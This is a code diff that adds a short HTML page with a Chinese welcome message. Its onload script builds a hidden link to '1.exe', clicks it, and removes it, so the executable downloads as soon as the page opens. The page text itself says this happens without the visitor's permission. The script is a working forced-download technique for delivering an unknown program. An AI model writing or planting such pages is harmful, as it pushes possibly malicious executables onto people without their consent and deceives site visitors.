@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>1</title>
+  <script>
+    window.onload = function() {
+      const link = document.createElement('a');
+      link.href = '1.exe';
+      link.download = '1.exe';
+      link.style.display = 'none';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    };
+  </script>
+</head>
+<body>
+  <h1>欢迎访问本页面</h1>
+  <p>文件将不经过您的允许自动下载，请稍候...</p>
+</body>
+</html>
